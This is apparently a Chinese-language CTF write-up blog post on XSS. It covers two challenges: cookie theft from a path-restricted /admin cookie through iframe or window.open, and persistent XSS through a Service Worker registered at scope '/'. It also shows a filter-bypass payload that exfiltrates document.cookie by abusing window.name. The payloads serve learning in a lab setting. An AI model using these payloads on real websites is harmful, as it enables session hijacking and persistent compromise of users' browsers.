---
title: xss 和 xss 持久化学习
date: '2022/12/02 16:05:01'
categories:
  - - web安全
description: xss 学习，利用 Service Worker 实现 xss 的持久化攻击
tags:
abbrlink:
---

# xss 和 xss 持久化学习

## geekgame-3rd 的 prob01-homepage 
[源码及wp](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob01-homepage)

题目给出的描述是：
本题提供了一个模拟受害者行为的程序，称为 XSS Bot。它会自动操作浏览器将 Flag 放置在目标网站上，然后访问你指定的网址。
请设法找到并利用目标网站上的漏洞，通过与 XSS Bot 交互获得受害者浏览器中的 Flag。

### 第一部分
```python
if protocol=='http': # flag 1
    with webdriver.Chrome(options=options) as driver:
        print('\nSetting up flag 1')
        driver.get(admin_url)
        time.sleep(.5)
        driver.execute_script(f'document.cookie = "flag={getflag(1)}; path=/admin"')
        time.sleep(.5)
        
        print('\nVisiting your webpage')
        driver.get(hacker_url)
        time.sleep(1)
        
        title = driver.title
        print('\nThe page title is:', title)
```

机器人先访问 admin 页面 ```admin_url```，然后在 cookie 放入 flag 之后，访问我们的网页 ```hacker_url```，这里的可控就相当多了，很自然可以想到，构建一个恶意的页面让机器人访问就行

```document.cookie``` 设置的 cookie，可以通过指定 path 属性来限制其在特定路径下的访问，因此需要设置网页的路径也在 ```/admin``` 下

因为这里是同源的，所以可以用 ```<iframe src="/admin/"></iframe>``` 的方式加载资源，实现将 cookie 加载进来当前页面

```html
<title id="mytitle">Web Page</title>
<iframe id="temp" src="/admin/"></iframe>
<script>
    setTimeout(()=>{
        var iframe = document.getElementById("temp");
        var iframeCookie = iframe.contentDocument.cookie;
        document.getElementById("mytitle").innerText = iframeCookie;
    }, 500);
</script>
```

也可以用 ```window.open()``` 一样的操作
```html
<title id="mytitle">Web Page</title>
<script>
    var newWindow = window.open('/admin/');
    setTimeout(()=>{
        var newWindowCookie = newWindow.document.cookie;
        document.getElementById("mytitle").innerText = newWindowCookie;
    }, 500);
</script>
```

这里一开始一直没拿到 cookie，后来发现需要 ```setTimeout()``` 持续执行

### 第二部分

```py
else: # https, flag 2
    
    with webdriver.Chrome(options=options) as driver:
        print('\nVisiting your webpage')
        driver.get(hacker_url)
        time.sleep(1)
        
    with webdriver.Chrome(options=options) as driver:
        print('\nSetting up flag 2')
        driver.get(admin_url)
        time.sleep(.5)
        driver.execute_script(f'document.cookie = "flag={getflag(2)}; path=/admin"')
        time.sleep(1)
    
        title = driver.title
        print('\nThe page title is:', title)
```

这里的话，会先访问我们的网页 ```hacker_url```，然后关掉这个页面之后，再去访问admin页面 ```admin_url```，这里就有点离谱了，第一个想法是都关掉了页面了，还能如何去攻击

还好官方给了提示
> 给 Cookie 设置 Path 并不能带来安全性。MDN 文档 专门有一节来指出其中的问题。
> 你需要 注册一个 [Service Worker](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers)，而且要注册到 "/" 这个 scope 上。

[XSS持久化：Service Worker](
https://misakikata.github.io/2021/06/XSS%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%9AService-Worker/) 这篇文章里面说的很清晰

> Service Worker 可以访问的内容：网络请求、缓存、消息推送、后台同步、全局状态
> Service Worker 不可以访问的内容：DOM、window 对象、用户界面、同步 XHR、Cookies

document 属于 Web API 中的 DOM（文档对象模型）接口，所以下面的操作是不行的
```js
this.addEventListener('fetch', function (event) {
    setInterval(() => {
        document.title = document.cookie;
    }, 200);
});
```

因此采取网络请求和缓存的方式，我们可以创建一个 hack 页面，在这个页面里面，设置监听，返回对 ```/admin``` 的访问信息
如果需要设置 Service Worker 允许跨路径的话，请求头要加上 ```"Service-Worker-Allowed":"/"```

```json
{"Content-Type": "application/javascript","Service-Worker-Allowed":"/"}
```

```js
this.addEventListener('fetch', function (event) {
  var url = event.request.url;
  if (url.includes('admin')) {
    event.respondWith(
      new Response('<script>setInterval(function() { document.title = document.cookie; }, 500);</script>', {
        headers: {'Content-Type': 'text/html'}
      })
    );
  }
});
```

再创建一个 hack2 页面，在这个页面注册 Service Worker，实现持久的 xss 攻击
```json
{"Content-Type": "text/html"}
```

```js
<script>
const registerServiceWorker = async () => {
  if ("serviceWorker" in navigator) {
    try {
      const registration = await navigator.serviceWorker.register("/hack/", {
        scope: "/",
      });
      if (registration.installing) {
        console.log("Service worker installing");
      } else if (registration.waiting) {
        console.log("Service worker installed");
      } else if (registration.active) {
        console.log("Service worker active");
      }
    } catch (error) {
      console.error(`Registration failed with ${error}`);
    }
  }
};
registerServiceWorker();
</script>
```

## Hackergame 2023 的 微积分计算小练习 2.0

给出的 bot 模拟了这样一个过程：你可以提交一段 HTML 代码，bot 会在本地启动一个 HTTP 服务器，然后 bot 会访问上面的练习网站，登录后在 cookie 中加入 JavaScript 可以访问到的经过 URL encode 之后的 flag，然后访问你的站点。Bot 不会输出任何网页内容。
题目环境不与互联网连接

题目给出的python脚本
```py
from selenium import webdriver
import selenium
import time
import os
import subprocess
import urllib.parse

# secret.py 不提供
from secret import FLAG, BOT_SECRET

os.mkdir("/dev/shm/xss-data")
os.mkdir("/dev/shm/chromium-data")
FLAG = urllib.parse.quote_plus(FLAG)
# 环境变量 "hackergame_token" 是你的 token
id = int(os.environ["hackergame_token"].split(":")[0])

# Stage 1
print("请输入你的 HTML 文件，以仅包含 EOF 三个字母的行结束，该文件需要小于 5KiB。")
print("我会在本地启动一个静态的 HTTP 服务器提供这个文件。")

code = ""
while True:
    line = input()
    if line == "EOF":
        break
    code += line + "\n"
    if len(code) > 1024 * 5:
        print("你的 HTML 太大了，尝试短一些吧！")
        exit(1)

with open("/dev/shm/xss-data/index.html", "w") as f:
    f.write(code)
sp = subprocess.Popen(
    ["python3", "-m", "http.server", "-b", "127.0.0.1", "10240"], cwd="/dev/shm/xss-data",
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)
time.sleep(1)
if sp.poll() is not None:
    print("启动 HTTP 服务器失败，请联系管理员。")
    exit(1)

# BOT 用 "BOT_SECRET" 以「管理员权限」登录，然后降权到和你一样
LOGIN_URL = f"http://web/?bot={BOT_SECRET}&id={id}"
# 在题目服务器上，bot 会访问 http://web
# 本地调试时，需要做如下修改：
# LOGIN_URL = "http://题目地址/?token=your_token"


# Stage 2
try:
    options = webdriver.ChromeOptions()
    options.add_argument("--no-sandbox")  # sandbox not working in docker
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--user-data-dir=/dev/shm/user-data")
    os.environ["TMPDIR"] = "/dev/shm/chromium-data/"
    options.add_experimental_option("excludeSwitches", ["enable-logging"])

    with webdriver.Chrome(options=options) as driver:
        ua = driver.execute_script("return navigator.userAgent")
        print(" I am using", ua)

        print("- Logining...")
        driver.get(LOGIN_URL)
        time.sleep(4)

        print(" Putting secret flag...")
        driver.execute_script(f'document.cookie="flag={FLAG}"')
        time.sleep(1)

        print("- Now browsing your website...")
        driver.get("http://localhost:10240")
        time.sleep(4)

        print("Bye bye!")
except Exception as e:
    print("ERROR", type(e))
    print("I'll not give you exception message this time.")
```

可以看到，先让我们提交一段 html 代码，机器人会将这段 html 代码构建一个页面，放到 127.0.0.1:10240


提交评论的页面的 JavaScript 代码
```js
<script>
    function updateElement(selector, html) {
      document.querySelector(selector).innerHTML = html;
    }
    updateElement("#score", "你的得分是 <b>0</b> 分");
    updateElement("#comment", "这里是提交的评论内容");
</script>
```

updateElement() 方法提供了攻击点，虽然有限制：评论不超过 25 个字，不允许出现的字符 ```& > < ' ( ) ` . , %```

一开始想了很多办法，后来发现原来还能通过 ```"``` 逃逸出来，所以使用这样的 ```"+[location=name]+"``` 去绕过，构建一个数组，在其中将 location 赋值成 name 的值

接下来就是构造 html 代码，这里直接用大佬的 js 了
```js
<script>
  window.name =
    "javascript:document.querySelector('textarea').value=document.cookie.replace(/%/g,'#').substring(50,75);document.querySelector('button').click()";
  location.href = "http://web/result";
</script>
```

当访问构造的这个页面时，会将 window.name 设置我们构造的 JavaScript 代码的字符串，然后立即将页面重定向到 "http://web/result"，也就是访问提交评论的页面
因为在前面评论的页面我们构造了 ```"+[location=name]+"```，页面的当前 URL 修改为 url + name 中的值，所以会导致 name 中的恶意代码被执行，从而得到 cookie 的内容

